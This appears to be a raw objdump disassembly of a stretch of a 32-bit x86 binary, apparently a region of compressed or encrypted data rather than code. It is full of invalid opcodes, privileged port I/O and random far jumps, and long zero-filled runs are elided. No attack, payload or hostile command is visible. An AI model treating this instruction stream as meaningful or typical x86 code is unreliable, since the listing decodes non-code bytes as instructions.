  41b4f6:	dec    ebx
  41b4f7:	rcr    ecx,0xd6
  41b4fa:	push   edx
  41b4fb:	pop    esp
  41b4fc:	sbb    al,0x62
  41b4fe:	cs sub eax,esi
  41b501:	es pop ebp
  41b503:	lahf   
  41b504:	push   cs
  41b505:	jns    0x41b501
  41b507:	das    
  41b508:	pop    edi
  41b509:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b50a:	and    ah,BYTE PTR [edx]
  41b50c:	xor    al,0xa1
  41b50e:	push   ds
  41b50f:	stos   BYTE PTR es:[edi],al
  41b510:	dec    ebx
	...
  41b571:	add    BYTE PTR [eax],al
  41b573:	add    ah,dl
  41b575:	in     al,dx
  41b576:	add    edi,edi
  41b578:	cmp    edi,edi
  41b57a:	(bad)  
  41b57b:	out    dx,eax
  41b57c:	loope  0x41b544
  41b57e:	jns    0x41b561
  41b580:	fidiv  DWORD PTR [ebx+0x4a]
  41b583:	xchg   edx,eax
  41b584:	and    al,BYTE PTR [bx+di]
  41b587:	add    BYTE PTR ds:0x19000001,al
  41b58d:	clc    
  41b58e:	std    
  41b58f:	pop    DWORD PTR [ebx+0x2ee86f4e]
  41b595:	mov    DWORD PTR [esi+0x27],edx
  41b598:	inc    eax
  41b599:	(bad)
  41b59d:	jno    0x41b5ac
  41b59f:	pop    edx
  41b5a0:	or     eax,0x2567849d
  41b5a5:	arpl   cx,bp
  41b5a7:	adc    DWORD PTR [ecx+0x7b],0xe6dec522
  41b5ae:	inc    esp
  41b5af:	and    BYTE PTR [esi-0x55],dh
  41b5b2:	xchg   ecx,eax
  41b5b3:	out    0xda,al
  41b5b5:	(bad)  
  41b5b6:	fcmove st,st(5)
  41b5b8:	or     ecx,DWORD PTR [ebp+0x37]
  41b5bb:	dec    esp
  41b5bc:	stos   BYTE PTR es:[edi],al
  41b5bd:	cmp    eax,DWORD PTR [bp+si]
  41b5c0:	pop    esi
  41b5c1:	lods   eax,DWORD PTR ds:[esi]
  41b5c2:	das    
  41b5c3:	test   DWORD PTR [ecx-0x3eead325],ebx
  41b5c9:	mov    ds:0x8721a853,al
  41b5ce:	push   ds
  41b5cf:	scas   al,BYTE PTR es:[edi]
  41b5d0:	pushf  
  41b5d1:	push   ebp
  41b5d2:	data16 xlat BYTE PTR ds:[ebx]
  41b5d4:	out    0x68,eax
  41b5d6:	(bad)  
  41b5d7:	fdiv   QWORD PTR [edi+0x5cacc9c4]
  41b5dd:	mov    ?,WORD PTR [edi]
  41b5df:	in     al,dx
  41b5e0:	shl    cl,cl
  41b5e2:	adc    dl,cl
  41b5e4:	xchg   esp,eax
  41b5e5:	xchg   edi,eax
  41b5e6:	mov    edx,0xd14c1696
  41b5eb:	push   es
  41b5ec:	mov    BYTE PTR [edx-0x7f],ah
  41b5ef:	dec    edi
  41b5f0:	dec    edi
  41b5f1:	icebp  
  41b5f2:	shl    BYTE PTR [edi-0x4087b42c],1
  41b5f8:	jmp    0x49d515bb
  41b5fd:	popa   
  41b5fe:	inc    edx
  41b5ff:	mov    fs,WORD PTR [edi+0x265580d4]
  41b605:	div    DWORD PTR [edx-0x628c9622]
  41b60b:	jnp    0x41b64e
  41b60d:	xchg   esi,eax
  41b60e:	addr16 dec edi
  41b610:	adc    al,0x1d
  41b612:	xchg   edx,eax
  41b613:	aas    
  41b614:	repnz adc al,0x45
  41b617:	imul   edx,DWORD PTR [ecx-0x3bb4ab11],0x28
  41b61e:	jmp    0x41b5ee
  41b620:	ltr    WORD PTR [esi+0x5a]
  41b624:	retf   
  41b625:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b626:	lahf   
  41b627:	jp     0x41b653
  41b629:	adc    eax,0xf4c1d3b8
  41b62e:	push   ebx
  41b62f:	test   DWORD PTR [ebp+edx*1+0x2818ccfb],edx
  41b636:	adc    cl,BYTE PTR [ecx]
  41b638:	je     0x41b682
  41b63a:	push   ss
  41b63b:	sub    dh,BYTE PTR [edx]
  41b63d:	cmp    dh,dl
  41b63f:	jbe    0x41b5d1
  41b641:	(bad)  
  41b642:	jns    0x41b5e9
  41b644:	or     eax,0x24f3cc37
  41b649:	leave  
  41b64a:	mov    WORD PTR [eax],?
  41b64c:	ret    0x40c3
  41b64f:	sbb    BYTE PTR [edi+0x6313dcb2],dl
  41b655:	jmp    0xb651f15b
  41b65a:	push   ss
  41b65b:	icebp  
  41b65c:	dec    esp
  41b65d:	rol    BYTE PTR [ebx+ecx*2+0x44a3e4ff],0x1a
  41b665:	xor    al,dh
  41b667:	push   0x3
  41b669:	fmul   DWORD PTR [ebp+0x52]
  41b66c:	stc    
  41b66d:	in     al,dx
  41b66e:	int    0x79
  41b670:	mov    al,0xe7
  41b672:	jmp    0xc3a8:0x46c898ab
  41b679:	push   0x5c
  41b67b:	nop
  41b67c:	cmp    eax,ebp
  41b67e:	outs   dx,BYTE PTR ds:[esi]
  41b67f:	aas    
  41b680:	ins    BYTE PTR es:[edi],dx
  41b681:	xor    al,BYTE PTR [ebx+esi*1-0x43ad3aca]
  41b688:	and    DWORD PTR [ebx+0x1eb49828],ebp
  41b68e:	sar    DWORD PTR [eax],cl
  41b690:	int    0x0
	...
  41b6f2:	add    BYTE PTR [eax],al
  41b6f4:	test   al,0x63
  41b6f6:	sbb    edx,DWORD PTR [esi+0x7fadfedb]
  41b6fc:	sti    
  41b6fd:	push   ds
  41b6fe:	mov    ah,dh
  41b700:	enter  0x3a61,0x56
  41b704:	ins    BYTE PTR es:[edi],dx
  41b705:	and    eax,DWORD PTR [ecx]
  41b707:	add    BYTE PTR ds:0xca000001,al
  41b70d:	mov    eax,0xf51ee4e9
  41b712:	sub    DWORD PTR [edi-0x43],ebx
  41b715:	lods   eax,DWORD PTR ds:[esi]
  41b716:	repnz daa 
  41b718:	cmp    edx,ebp
  41b71a:	pop    eax
  41b71b:	dec    eax
  41b71c:	mov    al,0xdb
  41b71e:	ret    
  41b71f:	ret    0xd299
  41b722:	cmp    DWORD PTR [edi],edx
  41b724:	push   esi
  41b725:	jnp    0x41b765
  41b727:	(bad)  
  41b729:	xor    DWORD PTR [esi-0x463abe7d],esi
  41b72f:	test   DWORD PTR ds:[esi-0x55],0x9522020c
  41b737:	cmc    
  41b738:	mov    cs,ebx
  41b73a:	sbb    ch,cl
  41b73c:	mov    ah,dl
  41b73e:	scas   al,BYTE PTR es:[edi]
  41b73f:	ja     0x41b78a
  41b741:	sub    DWORD PTR [ebp-0x708eee3b],0x4d
  41b748:	or     BYTE PTR [esi+eiz*1+0x71],dl
  41b74c:	pop    es
  41b74d:	in     al,dx
  41b74e:	push   cs
  41b74f:	jno    0x41b6fc
  41b751:	jl     0x41b731
  41b753:	sub    bl,BYTE PTR [ebx+0x6c]
  41b756:	aad    0x8
  41b758:	enter  0x71d3,0xf2
  41b75c:	and    BYTE PTR [esi],bh
  41b75e:	test   eax,0x2a5f9745
  41b763:	mov    dh,0xfc
  41b765:	into   
  41b766:	xchg   ebx,eax
  41b767:	sbb    dh,BYTE PTR [ebp-0x76896f8b]
  41b76d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b76e:	xor    DWORD PTR [ebx],ebx
  41b770:	data16 sbb bh,bh
  41b773:	sbb    al,0xc1
  41b775:	in     eax,dx
  41b776:	loop   0x41b722
  41b778:	jl     0x41b71f
  41b77a:	push   0x8d8e25cc
  41b77f:	cmp    DWORD PTR [edx],esi
  41b781:	fs xchg ebx,eax
  41b783:	and    al,0xaa
  41b785:	icebp  
  41b786:	mov    esi,0xdd78deaa
  41b78b:	cmp    ebx,DWORD PTR [eax+edi*4]
  41b78e:	dec    ecx
  41b78f:	dec    esi
  41b790:	outs   dx,BYTE PTR ds:[esi]
  41b791:	and    ah,BYTE PTR ds:0x3b5be620
  41b797:	cmp    al,0x99
  41b799:	adc    eax,0x8a5c4b2
  41b79e:	ins    BYTE PTR es:[edi],dx
  41b79f:	es add al,0xdb
  41b7a2:	sbb    al,0xe7
  41b7a4:	icebp  
  41b7a5:	call   0x3b64:0xece5141e
  41b7ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b7ad:	rol    BYTE PTR [ecx+0x79],0xc6
  41b7b1:	fxch   st(1)
  41b7b3:	ficom  WORD PTR [ebp+0x4d]
  41b7b6:	mov    ch,0x96
  41b7b8:	jns    0x41b7dd
  41b7ba:	outs   dx,BYTE PTR ds:[esi]
  41b7bb:	enter  0x3058,0x1c
  41b7bf:	add    BYTE PTR [esi],dh
  41b7c1:	enter  0x664,0xef
  41b7c5:	mov    eax,ds:0x34a91625
  41b7ca:	pop    ebp
  41b7cb:	push   ds
  41b7cc:	xchg   ecx,eax
  41b7cd:	mov    eax,DWORD PTR [eax]
  41b7cf:	dec    ebp
  41b7d0:	bound  ecx,QWORD PTR [ebx-0x6f9f6d08]
  41b7d6:	push   ecx
  41b7d7:	push   ebx
  41b7d8:	stos   DWORD PTR es:[edi],eax
  41b7d9:	in     eax,dx
  41b7da:	pop    edx
  41b7db:	repz retf 
  41b7dd:	sbb    eax,0xdd3f3664
  41b7e2:	stos   BYTE PTR es:[edi],al
  41b7e3:	jle    0x41b80c
  41b7e5:	outs   dx,DWORD PTR ds:[esi]
  41b7e6:	test   eax,ebp
  41b7e8:	std    
  41b7e9:	mov    eax,ds:0x9a1d8cf
  41b7ee:	call   0xb83c:0xa0f7e891
  41b7f5:	sub    edx,ecx
  41b7f7:	add    eax,0x24885935
  41b7fc:	cmovl  eax,DWORD PTR [esi+ebx*4+0x7a0ed567]
  41b804:	sub    BYTE PTR [ebp-0x20],dl
  41b807:	sbb    al,ah
  41b809:	cmp    BYTE PTR [edi+0x79],al
  41b80c:	jns    0x41b7bc
  41b80e:	pop    ebx
  41b80f:	fmul   st,st(3)
	...
  41b871:	add    BYTE PTR [eax],al
  41b873:	add    BYTE PTR [edx-0x8b13804],cl
  41b879:	jg     0x41b806
  41b87b:	cld    
  41b87c:	ret    0x78e3
  41b87f:	add    al,0x8d
  41b881:	sbb    BYTE PTR [esi+0x12471b6],ch
  41b887:	add    BYTE PTR ds:0x9c000001,al
  41b88d:	test   DWORD PTR [ebx],ebp
  41b88f:	mov    bl,0x49
  41b891:	jecxz  0x41b83a
  41b893:	and    ebx,ebx
  41b895:	aas    
  41b896:	nop
  41b897:	jmp    0x41b8d3
  41b899:	in     eax,dx
  41b89a:	stos   DWORD PTR es:[edi],eax
  41b89b:	xor    al,ah
  41b89d:	pusha  
  41b89e:	test   eax,0xa9943655
  41b8a4:	shr    esi,1
  41b8a6:	stc    
  41b8a7:	jb     0x41b875
  41b8a9:	add    dh,dl
  41b8ab:	stos   DWORD PTR es:[edi],eax
  41b8ac:	and    ebp,DWORD PTR [eax-0x47]
  41b8af:	pop    ss
  41b8b0:	clc    
  41b8b1:	push   cs
  41b8b2:	push   esi
  41b8b3:	movsx  esp,BYTE PTR [ecx*1-0x1402244d]
  41b8bb:	neg    BYTE PTR cs:[edi+0x33]
  41b8bf:	call   DWORD PTR [edx]
  41b8c1:	loopne 0x41b8b2
  41b8c3:	and    eax,0xb360de2f
  41b8c8:	(bad)  
  41b8c9:	neg    DWORD PTR [esi]
  41b8cb:	and    eax,0xa11d6be3
  41b8d0:	xchg   ebp,eax
  41b8d1:	jg     0x41b8b4
  41b8d3:	(bad)  
  41b8d4:	mov    ds:0xb791e67e,al
  41b8d9:	lods   eax,DWORD PTR ds:[esi]
  41b8da:	das    
  41b8db:	pop    es
  41b8dc:	dec    esp
  41b8dd:	pop    esp
  41b8de:	sbb    ebx,DWORD PTR [edi-0x24]
  41b8e1:	int    0x5a
  41b8e3:	lods   eax,DWORD PTR ds:[esi]
  41b8e4:	sub    eax,0x3bffa2a7
  41b8e9:	cs aas 
  41b8eb:	jg     0x41b871
  41b8ed:	clc    
  41b8ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b8ef:	aad    0x3e
  41b8f1:	sub    edx,DWORD PTR [ecx+ebx*1]
  41b8f4:	ds in  al,dx
  41b8f6:	int    0x52
  41b8f8:	call   0x69057b07
  41b8fd:	fprem  
  41b8ff:	and    ecx,DWORD PTR [ebx+0x94523a4]
  41b905:	int3   
  41b906:	push   ecx
  41b907:	xchg   edx,eax
  41b908:	xchg   BYTE PTR [edx],cl
  41b90a:	test   DWORD PTR [ebx-0x13c5bdf7],0xf03e0bf6
  41b914:	sbb    DWORD PTR [esp],eax
  41b917:	and    DWORD PTR ds:0xc7591aed,esi
  41b91d:	mov    eax,0xbb49ea69
  41b922:	or     al,0xc9
  41b924:	ds ret 0xdf83
  41b928:	mov    al,ss:0xb546faf4
  41b92e:	out    dx,eax
  41b92f:	push   ebx
  41b930:	lods   al,BYTE PTR ds:[esi]
  41b931:	sub    al,0xcf
  41b933:	add    BYTE PTR ds:0x20e5c67e,cl
  41b939:	dec    edi
  41b93a:	test   ch,ah
  41b93c:	repz jo 0x41b8f8
  41b93f:	ja     0x41b8fc
  41b941:	fist   WORD PTR [ecx-0x8846ea0]
  41b947:	and    BYTE PTR [ebx],0x13
  41b94a:	lods   al,BYTE PTR ds:[esi]
  41b94b:	pop    esp
  41b94c:	cmp    BYTE PTR [eax+0x3c],al
  41b94f:	std    
  41b950:	sub    al,0x43
  41b952:	iret   
  41b953:	cvtps2pi mm3,xmm0
  41b956:	imul   edi,DWORD PTR [ecx+0x1b2b1ed4],0x7bc0e8ea
  41b960:	fstp   st(7)
  41b962:	mov    esp,0xd0140b51
  41b967:	cs push esi
  41b969:	add    eax,0xd708beab
  41b96e:	cmp    eax,0xe940fb0d
  41b973:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b974:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b975:	xor    DWORD PTR [esp+esi*2-0x6ae7167b],ebp
  41b97c:	pusha  
  41b97d:	or     esi,DWORD PTR [ecx]
  41b97f:	cmp    dh,dl
  41b981:	mov    ah,0x6d
  41b983:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b984:	add    BYTE PTR [eax+0x8],dh
  41b987:	aas    
  41b988:	popf   
  41b989:	pop    esp
  41b98a:	jo     0x41b978
  41b98c:	jne    0x41b950
  41b98e:	loopne 0x41ba04
  41b990:	sub    DWORD PTR [eax],eax
	...
  41b9f2:	add    BYTE PTR [eax],al
  41b9f4:	ret    
  41b9f5:	mov    esp,0xf87f4844
  41b9fa:	iret   
  41b9fb:	mov    edi,0x8c8b3b8c
  41ba00:	js     0x41ba2e
  41ba02:	lods   eax,DWORD PTR ds:[esi]
  41ba03:	jae    0x41ba7b
  41ba05:	and    eax,0x1050001
  41ba0a:	add    BYTE PTR [eax],al
  41ba0c:	xchg   edi,eax
  41ba0d:	mov    ebx,0x635fa3d2
  41ba12:	mov    dl,0x14
  41ba14:	ror    dl,1
  41ba16:	adc    al,0xbc
  41ba18:	mov    ds:0xafba74a8,al
  41ba1d:	sbb    al,0xe8
  41ba1f:	outs   dx,DWORD PTR ds:[esi]
  41ba20:	cmp    eax,0x7f41bd3a
  41ba25:	mov    ss,WORD PTR [eax+eiz*2+0x30]
  41ba29:	mov    dh,0x8f
  41ba2b:	push   0xc4dc2c7b
  41ba30:	sbb    bl,BYTE PTR [ebp+0x2e]
  41ba33:	pop    ecx
  41ba34:	jl     0x41ba9e
  41ba36:	(bad)  
  41ba37:	mov    bh,0x35
  41ba39:	sub    ebx,DWORD PTR [edi-0x6a]
  41ba3c:	(bad)  
  41ba3d:	cmc    
  41ba3e:	adc    al,0xf3
  41ba40:	in     eax,dx
  41ba41:	xor    esi,esp
  41ba43:	cmc    
  41ba44:	mov    al,ds:0x6b0b9b81
  41ba49:	sti    
  41ba4a:	js     0x41ba87
  41ba4c:	fdivr  QWORD PTR [edi+0x37]
  41ba4f:	mov    esi,0x8a6cdd6
  41ba54:	in     al,dx
  41ba55:	lods   eax,DWORD PTR ds:[esi]
  41ba56:	shl    BYTE PTR [ebp-0x1448b585],cl
  41ba5c:	mov    eax,ds:0x8b8f6eae
  41ba61:	sbb    al,0x5
  41ba63:	repnz stc 
  41ba65:	pushf  
  41ba66:	scas   eax,DWORD PTR es:[edi]
  41ba67:	mov    ebp,DWORD PTR [ecx-0x1d0d06d3]
  41ba6d:	or     DWORD PTR [edx+0x3bb44fd8],ebp
  41ba73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ba74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba75:	mov    cs,WORD PTR [edi]
  41ba77:	sub    esi,DWORD PTR [edx]
  41ba79:	push   0xffffffed
  41ba7b:	mov    eax,ds:0x6a791f4c
  41ba80:	dec    edi
  41ba81:	push   edi
  41ba82:	pop    esp
  41ba83:	mov    DWORD PTR [edx-0x2f4d170a],edi
  41ba89:	adc    al,0xe4
  41ba8b:	aas    
  41ba8c:	xchg   ecx,edx
  41ba8e:	lds    ebx,FWORD PTR [edx-0x70]
  41ba91:	sbb    DWORD PTR [ecx],edi
  41ba93:	daa    
  41ba94:	outs   dx,DWORD PTR ds:[esi]
  41ba95:	xchg   ebp,eax
  41ba96:	jp     0x41baaf
  41ba98:	mov    es,ebp
  41ba9a:	fdivr  DWORD PTR [ebp-0x6a49335]
  41baa0:	loop   0x41bb1e
  41baa2:	push   eax
  41baa3:	repnz addr16 mov ch,0x85
  41baa7:	cmp    DWORD PTR [ebx],ebx
  41baa9:	(bad)  
  41baaa:	out    0x5a,al
  41baac:	div    DWORD PTR [ebx-0xc6bfa0a]
  41bab2:	push   esp
  41bab3:	xchg   ebp,eax
  41bab4:	icebp  
  41bab5:	stos   DWORD PTR es:[edi],eax
  41bab6:	xchg   al,al
  41bab8:	xchg   BYTE PTR [edi],al
  41baba:	bound  ebp,QWORD PTR [edi-0x3242ff79]
  41bac0:	pop    esp
  41bac1:	test   eax,0x9cd951eb
  41bac6:	sub    al,0x62
  41bac8:	pop    eax
  41bac9:	sbb    ebx,DWORD PTR [esp+ebx*8]
  41bacc:	push   ebx
  41bacd:	push   edx
  41bace:	fs pop ebp
  41bad0:	scas   al,BYTE PTR es:[edi]
  41bad1:	cwde   
  41bad2:	retf   0xb783
  41bad5:	sub    al,0xd6
  41bad7:	dec    esp
  41bad8:	push   edx
  41bad9:	or     BYTE PTR [edx],0x31
  41badc:	cdq    
  41badd:	inc    eax
  41bade:	mov    al,0x99
  41bae0:	mov    BYTE PTR ds:0xfa8a15ce,dl
  41bae6:	dec    edi
  41bae7:	sbb    eax,DWORD PTR [ecx+0x11]
  41baea:	xchg   edx,eax
  41baeb:	fdiv   QWORD PTR [esi+eax*2]
  41baee:	shl    edi,0xda
  41baf1:	cdq    
  41baf2:	mov    eax,edi
  41baf4:	and    ebx,0x1d674c14
  41bafa:	jnp    0x41bb3a
  41bafc:	test   BYTE PTR [ebx+edi*8+0x48609459],dh
  41bb03:	and    DWORD PTR [ebx-0x7],ecx
  41bb06:	adc    al,0x20
  41bb08:	push   es
  41bb09:	pop    ds
  41bb0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bb0b:	add    cl,BYTE PTR [ebx+edx*1+0x534cc9]
	...
  41bb72:	add    BYTE PTR [eax],al
  41bb74:	or     bh,BYTE PTR [eax-0x4048555b]
  41bb7a:	(bad)  
  41bb7c:	jg     0x41bb83
  41bb7e:	arpl   WORD PTR [edi+0x2b],cx
  41bb81:	and    ebp,DWORD PTR [ebx+0x1267bc4]
  41bb87:	add    BYTE PTR ds:0x8a000001,al
  41bb8d:	jo     0x41bbdd
  41bb8f:	repz mov ebp,0xf9acf337
  41bb95:	imul   edi,DWORD PTR [eax],0x3b
  41bb98:	mov    dh,0x8
  41bb9a:	push   ds
  41bb9b:	in     eax,dx
  41bb9c:	call   0xe3c7:0xee68f28c
  41bba3:	mov    dl,0x30
  41bba5:	in     al,0xa8
  41bba7:	pop    ss
  41bba8:	(bad)  [edi+0x3abe899a]
  41bbae:	and    al,0x2c
  41bbb0:	pop    eax
  41bbb1:	test   BYTE PTR [eax],0x30
  41bbb4:	cmp    al,0x66
  41bbb6:	xlat   BYTE PTR ds:[ebx]
  41bbb7:	sub    cl,BYTE PTR [edx]
  41bbb9:	jmp    0x3558576a
  41bbbe:	pop    ds
  41bbbf:	dec    esp
  41bbc0:	fmul   QWORD PTR [eax+0x57]
  41bbc3:	aaa    
  41bbc4:	in     al,dx
  41bbc5:	jle    0x41bbb4
  41bbc7:	cmp    al,0xc1
  41bbc9:	pop    ebp
  41bbca:	in     al,0xee
  41bbcc:	inc    edx
  41bbcd:	sbb    eax,0xb8514230
  41bbd2:	mov    bh,0x61
  41bbd4:	rcr    ebx,cl
  41bbd6:	pushf  
  41bbd7:	rcr    BYTE PTR [ecx+0x4f9aa81],cl
  41bbdd:	sar    BYTE PTR [ecx+0x6],cl
  41bbe0:	mov    edi,DWORD PTR cs:[eax-0x66c09156]
  41bbe7:	or     eax,0xcbb48554
  41bbec:	mov    bh,0x17
  41bbee:	shl    BYTE PTR [ebx+0x3f4a1132],0xd8
  41bbf5:	sbb    edx,ebp
  41bbf7:	or     DWORD PTR [eax+0x69],0x80445f7
  41bbfe:	call   0xb66f3f6b
  41bc03:	popf   
  41bc04:	ins    DWORD PTR es:[edi],dx
  41bc05:	and    al,0x63
  41bc07:	and    eax,0x50f7294d
  41bc0c:	push   0x159e007e
  41bc11:	es scas al,BYTE PTR es:[edi]
  41bc13:	push   esp
  41bc14:	es int 0xa5
  41bc17:	loop   0x41bc86
  41bc19:	push   edi
  41bc1a:	clc    
  41bc1b:	mov    esi,ecx
  41bc1d:	dec    esp
  41bc1e:	push   eax
  41bc1f:	rcl    DWORD PTR [edx+0x4ec5399b],0xd7
  41bc26:	std    
  41bc27:	cmp    esp,edx
  41bc29:	mov    ch,0x89
  41bc2b:	movzx  edx,BYTE PTR [eax+0x2337acea]
  41bc32:	dec    ebx
  41bc33:	ffreep st(3)
  41bc35:	adc    bh,BYTE PTR [edx-0x67]
  41bc38:	pop    esp
  41bc39:	mov    al,BYTE PTR [eax]
  41bc3b:	sub    ebp,esi
  41bc3d:	stos   BYTE PTR es:[edi],al
  41bc3e:	sub    dl,BYTE PTR [esi-0x8c653c0]
  41bc44:	fwait
  41bc45:	mov    ah,0xbb
  41bc47:	add    DWORD PTR ds:0xbbe3213a,edi
  41bc4d:	fdivr  QWORD PTR [eax-0x52]
  41bc50:	es clc 
  41bc52:	ins    DWORD PTR es:[edi],dx
  41bc53:	adc    ebp,DWORD PTR [ebp-0x6c]
  41bc56:	mov    esi,DWORD PTR [ebp+0x2bedbb5d]
  41bc5c:	push   0x74873db5
  41bc61:	sbb    al,0x2b
  41bc63:	das    
  41bc64:	outs   dx,BYTE PTR ds:[esi]
  41bc65:	mov    esp,edi
  41bc67:	prefetchw BYTE PTR [edx-0x3b47e74]
  41bc6e:	loopne 0x41bc26
  41bc70:	mov    ebp,fs
  41bc72:	mov    WORD PTR [ecx-0x627674ce],?
  41bc78:	(bad)  
  41bc79:	cmp    DWORD PTR [ebx+0x7e47248b],edi
  41bc7f:	fs sbb al,0xe
  41bc82:	push   ecx
  41bc83:	cmp    DWORD PTR [ebp+0xfce584],edx
  41bc89:	imul   edx,DWORD PTR [ebp-0x1c],0xc909dfbb
  41bc90:	cmp    eax,0x0
	...
  41bcf1:	add    BYTE PTR [eax],al
  41bcf3:	add    dl,dl
  41bcf5:	xor    bh,dl
  41bcf7:	clc    
  41bcf8:	cli    
  41bcf9:	clc    
  41bcfa:	sar    BYTE PTR [edx],cl
  41bcfc:	sti    
  41bcfd:	mov    ebp,0x2b26d9d8
  41bd02:	jg     0x41bcc6
  41bd04:	and    BYTE PTR [edi],0x1
  41bd07:	add    BYTE PTR ds:0x33000001,al
  41bd0d:	adc    BYTE PTR [edx],ch
  41bd0f:	stos   BYTE PTR es:[edi],al
  41bd10:	jbe    0x41bc99
  41bd12:	fwait
  41bd13:	dec    eax
  41bd14:	mov    esp,DWORD PTR [esi-0x3f]
  41bd17:	(bad)  
  41bd18:	push   ecx
  41bd19:	fist   DWORD PTR ds:0x47295fb7
  41bd1f:	cmp    edi,DWORD PTR [ebx+0x6a]
  41bd22:	jp     0x41bd74
  41bd24:	ins    BYTE PTR es:[edi],dx
  41bd25:	xor    eax,0xd79b3efe
  41bd2a:	inc    ebx
  41bd2b:	add    al,0x8c
  41bd2d:	test   al,0xd0
  41bd2f:	aas    
  41bd30:	repz enter 0x2b63,0xfb
  41bd35:	sub    edi,DWORD PTR ds:0x6aac785a
  41bd3b:	sbb    eax,0xb091c164
  41bd40:	sbb    bh,bl
  41bd42:	mov    esi,0x2f35009e
  41bd47:	pop    es
  41bd48:	mov    al,ds:0x47ea89da
  41bd4d:	aaa    
  41bd4e:	adc    DWORD PTR [eax-0x5aedc595],0x48f651c3
  41bd58:	pop    ds
  41bd59:	sbb    edx,DWORD PTR gs:[ebx+eiz*1]
  41bd5d:	dec    esi
  41bd5e:	mov    eax,0x9ed5f565
  41bd63:	jmp    0x8ff96f41
  41bd68:	jmp    0x5f50:0x1f69504d
  41bd6f:	push   ebx
  41bd70:	or     BYTE PTR [ecx+0x778f4fa3],cl
  41bd76:	jo     0x41bd24
  41bd78:	lock jne 0x41bd0d
  41bd7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bd7c:	rcr    BYTE PTR [ecx+ebp*2-0x12],cl
  41bd80:	nop
  41bd81:	mov    edi,0x9378a2e0
  41bd86:	pop    eax
  41bd87:	in     al,0x6c
  41bd89:	jb     0x41bdf1
  41bd8b:	repz rcr DWORD PTR [ecx+0xc1e320b],0x7
  41bd93:	inc    esp
  41bd94:	mov    ecx,0x690fa314
  41bd99:	xchg   esi,eax
  41bd9a:	xchg   esi,eax
  41bd9b:	sub    DWORD PTR [ebp-0x7],0xffffffed
  41bd9f:	xchg   DWORD PTR [ebp-0x5632e3c3],edi
  41bda5:	ror    DWORD PTR [eax],0x39
  41bda8:	pop    ebp
  41bda9:	and    ch,BYTE PTR [ebp+0x56]
  41bdac:	add    al,0xf3
  41bdae:	mov    edx,0x32eaf5f5
  41bdb3:	(bad)  
  41bdb4:	or     eax,0xb4406255
  41bdb9:	mov    WORD PTR [edx+0x2790f65f],gs
  41bdbf:	cmc    
  41bdc0:	dec    ebx
  41bdc1:	imul   BYTE PTR [eax]
  41bdc3:	mov    ah,0x22
  41bdc5:	inc    ecx
  41bdc6:	retf   0x7565
  41bdc9:	jae    0x41be20
  41bdcb:	test   DWORD PTR [eax],ebx
  41bdcd:	sub    DWORD PTR [eax],0x911ff913
  41bdd3:	adc    al,0x46
  41bdd5:	mov    ebp,0xc799063e
  41bdda:	int    0xd7
  41bddc:	push   ss
  41bddd:	leave  
  41bdde:	data16 adc bh,BYTE PTR [edx+0x406be668]
  41bde5:	mov    eax,0x13d92baf
  41bdea:	and    eax,0xc18f6537
  41bdef:	cmp    eax,0xaa4c2a6e
  41bdf4:	sti    
  41bdf5:	or     al,0x72
  41bdf7:	sar    DWORD PTR [esi-0x5c],cl
  41bdfa:	cdq    
  41bdfb:	test   eax,0xe1d9a489
  41be00:	push   edx
  41be01:	add    DWORD PTR [ecx-0x114920b8],0x65fad083
  41be0b:	and    BYTE PTR [esi-0xf],bl
  41be0e:	repnz (bad) 
  41be10:	mov    bl,0x0
	...
  41be72:	add    BYTE PTR [eax],al
  41be74:	test   DWORD PTR [ebp+0x7b9c6a9c],ecx
  41be7a:	imul   edi
  41be7c:	mov    ebp,DWORD PTR [ecx-0x8d7c09a]
  41be82:	int3   
  41be83:	add    DWORD PTR [ebp+0x5000128],0xdc000001
  41be8d:	sbb    DWORD PTR [ebx+0x1],ebp
  41be90:	out    0xa9,al
  41be92:	and    eax,0x3ecc7a54
  41be97:	mov    esp,0xdb6608fc
  41be9c:	sahf   
  41be9d:	in     al,dx
  41be9e:	in     al,0x8c
  41bea0:	retf   0x3830
  41bea3:	loop   0x41be46
  41bea5:	ret    0x92a1
  41bea8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bea9:	std    
  41beaa:	std    
  41beab:	xchg   edi,eax
  41beac:	adc    DWORD PTR [edx],0xfffffffd
  41beaf:	outs   dx,BYTE PTR ds:[esi]
  41beb0:	sub    DWORD PTR [ebp+0xf8a9f51],0x16076108
  41beba:	fild   DWORD PTR [edx+0x1b7b8ebc]
  41bec0:	xchg   esp,eax
  41bec1:	mul    DWORD PTR [edx-0x2d]
  41bec4:	loop   0x41be46
  41bec6:	xor    BYTE PTR [ebx-0x5],cl
  41bec9:	stc    
  41beca:	sub    al,0x39
  41becc:	iret   
  41becd:	mov    WORD PTR [eax+0x3423afaa],fs
  41bed3:	inc    edi
  41bed4:	and    ah,BYTE PTR [edi]
  41bed6:	push   ebx
  41bed7:	(bad)  
  41bed8:	lods   eax,DWORD PTR ds:[esi]
  41bed9:	outs   dx,BYTE PTR ds:[esi]
  41beda:	repz cli 
  41bedc:	xchg   edi,eax
  41bedd:	and    cl,BYTE PTR [edx-0x2d]
  41bee0:	cld    
  41bee1:	test   al,0x73
  41bee3:	xor    al,0xc1
  41bee5:	inc    BYTE PTR [ecx-0x10938967]
  41beeb:	lods   eax,DWORD PTR ds:[esi]
  41beec:	mov    ecx,0x2f0b6033
  41bef1:	cmp    DWORD PTR [esi-0xc],eax
  41bef4:	or     BYTE PTR [ecx+0x57],al
  41bef7:	mov    ebx,0x299fe117
  41befc:	xlat   BYTE PTR ds:[ebx]
  41befd:	mov    edi,0x89ae2163
  41bf02:	mov    BYTE PTR [edi],bl
  41bf04:	test   al,0xbc
  41bf06:	push   ebx
  41bf07:	out    0x68,al
  41bf09:	sbb    al,0xcb
  41bf0b:	pop    esp
  41bf0c:	sub    ah,al
  41bf0e:	retf   
